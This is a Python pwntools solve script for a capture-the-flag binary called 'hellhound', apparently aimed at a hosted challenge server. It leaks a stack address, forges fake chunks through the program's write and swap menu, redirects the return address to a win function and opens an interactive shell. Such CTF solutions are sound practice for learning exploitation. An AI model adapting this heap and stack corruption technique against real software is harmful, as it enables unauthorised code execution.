import argparse
import time
from pwn import *

context.binary = './hellhound_patched'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

HOST = "94.237.63.93:31924"

def attach_gdb(proc):
  gdb.attach(proc, gdbscript="""

  """)
  time.sleep(3)

def get_process(is_remote=False, is_debug=False):
  if is_remote:
    return remote(HOST.split(":")[0], int(HOST.split(":")[1]))

  proc = process()
  attach_gdb(proc)
  return proc

func_berserk_mode_off = 0x400977

def write(proc, payload):
  proc.sendlineafter(b'>> ', b'2')
  proc.sendlineafter(b'Write some code: ', b''.join(payload))
  proc.sendlineafter(b'>> ', b'3') # does a swap; ptr = *(ptr+8)

def main(args):
  proc = get_process(args.remote, args.debug)

  # somehow instantiate this process??, might be able to inherit the process object, then include a static builder as well
  # make a read with a $$ marker, so recvbetween function that will let you just do something like
  # proc.recvuntil(b'[+] In the back of its head you see this serial number: [$$]')

  proc.sendlineafter(b'>> ', b'1')
  proc.recvuntil(b'[+] In the back of its head you see this serial number: [')
  leak = int(proc.recvline().strip().decode()[:-1])
  rip_leak = leak + 0x50 # lets hope we are doing it
  stack_space = leak + 8

  write(proc, [b'A'*8, p64(rip_leak)]) # start writing fake chunks
  write(proc, [p64(func_berserk_mode_off), p64(stack_space)])
  write(proc, [p64(0), p64(stack_space+8)])
  write(proc, [p64(0x20), p64(stack_space + 16)])
  write(proc, [b'A'*8, p64(stack_space + 24)])
  write(proc, [b'A'*8, p64(stack_space + 32)])
  write(proc, [p64(0), p64(stack_space+40)])

  proc.sendlineafter(b'>> ', b'2')
  proc.send(b''.join([p64(0x60), p64(stack_space + 16)]))
  proc.sendlineafter(b'>> ', b'3') # does a swap; ptr = *(ptr+8)

  proc.sendlineafter(b'>> ', b'69')
  proc.interactive()
  
if __name__ == '__main__':
  parser = argparse.ArgumentParser(description="Solve script")
  parser.add_argument("-r","--remote", action='store_true')
  parser.add_argument("-d","--debug", action='store_true')

  args = parser.parse_args()
  
  if args.remote and args.debug:
    print("Can't debug remote process, need a gdbserver")
    exit(-1)

  # would be cool if you could disable pie and load the binary in the same spot as ghidra

  main(args)
